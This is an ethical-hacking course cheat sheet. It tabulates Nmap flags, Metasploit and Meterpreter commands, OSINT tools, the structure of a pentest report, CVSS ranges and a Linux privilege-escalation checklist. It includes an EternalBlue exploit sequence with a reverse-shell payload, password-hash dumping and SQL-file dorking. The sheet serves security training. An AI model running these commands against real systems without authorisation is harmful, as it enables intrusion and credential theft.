# Month 7 — Ethical Hacking Cheat Sheet

## Nmap Flag Reference

| Flag | Meaning | Example |
|---|---|---|
| `-sS` | SYN (stealth) scan | `nmap -sS target` |
| `-sT` | TCP connect scan (no raw socket needed) | `nmap -sT target` |
| `-sU` | UDP scan | `nmap -sU -p 53,161 target` |
| `-sn` | No port scan (ping sweep) | `nmap -sn 10.0.0.0/24` |
| `-sV` | Service version detection | `nmap -sV target` |
| `-sC` | Default NSE scripts | `nmap -sC target` |
| `-O` | OS fingerprinting | `nmap -O target` |
| `-A` | Aggressive (OS+version+scripts+traceroute) | `nmap -A target` |
| `-p-` | All 65535 ports | `nmap -p- target` |
| `-p 80,443` | Specific ports | `nmap -p 22,80,443 target` |
| `--top-ports 1000` | Top 1000 ports | `nmap --top-ports 1000 target` |
| `-T4` | Timing template (0-5, higher = faster) | `nmap -T4 target` |
| `-oN file.txt` | Normal output to file | `nmap -oN out.txt target` |
| `-oX file.xml` | XML output | `nmap -oX out.xml target` |
| `--script vuln` | Run vuln category scripts | `nmap --script vuln target` |
| `--script smb-enum-users` | Specific NSE script | `nmap --script smb-enum-users target` |

## Metasploit Quick Commands

| Command | Purpose |
|---|---|
| `search eternalblue` | Search modules by keyword |
| `use exploit/windows/smb/ms17_010_eternalblue` | Load a module |
| `show options` | View required options |
| `set RHOSTS 10.0.0.5` | Set target |
| `set LHOST 10.0.0.1` | Set attacker IP |
| `set payload windows/x64/meterpreter/reverse_tcp` | Choose payload |
| `run` / `exploit` | Launch the attack |
| `sessions -l` | List open sessions |
| `sessions -i 1` | Interact with session 1 |
| `background` | Background current session |

## Meterpreter Commands

| Command | Purpose |
|---|---|
| `sysinfo` | Target OS info |
| `getuid` | Current user |
| `getpid` | Current process ID |
| `ps` | List running processes |
| `migrate <pid>` | Migrate to another process |
| `hashdump` | Dump local password hashes |
| `upload src dst` | Upload file to target |
| `download src dst` | Download file from target |
| `shell` | Drop to OS shell |
| `getsystem` | Attempt privilege escalation |
| `run post/multi/recon/local_exploit_suggester` | Find local exploits |

## OSINT Quick Reference

| Tool | Use Case | Command / URL |
|---|---|---|
| theHarvester | Email/subdomain harvesting | `theHarvester -d target.com -b google` |
| Shodan | Device search | `https://shodan.io` / `shodan search apache` |
| WHOIS | Domain registration | `whois target.com` |
| Amass | Subdomain enumeration | `amass enum -d target.com` |
| Maltego | Visual OSINT graphs | GUI tool |
| Google | Dorking | `site:target.com filetype:sql` |

## Penetration Test Report Sections

1. Executive Summary — risk level, business impact, key findings
2. Scope & Methodology — what was tested, tools used, timeline
3. Findings — each vuln: title, CVSS score, evidence, remediation
4. Risk Matrix — likelihood × impact grid
5. Appendix — raw tool output, screenshots, payloads

## CVSS v3.1 Score Ranges

| Score | Severity |
|---|---|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| 9.0 – 10.0 | Critical |

## Linux Privilege Escalation Checklist

```
[ ] sudo -l                        # Sudo rights
[ ] find / -perm -4000 2>/dev/null # SUID binaries
[ ] cat /etc/crontab               # Cron jobs
[ ] env                            # Environment variables / PATH
[ ] cat /proc/version              # Kernel version -> searchsploit
[ ] find / -writable -type f 2>/dev/null | grep -v proc  # Writable files
[ ] ss -tulpn                      # Listening services (internal)
```
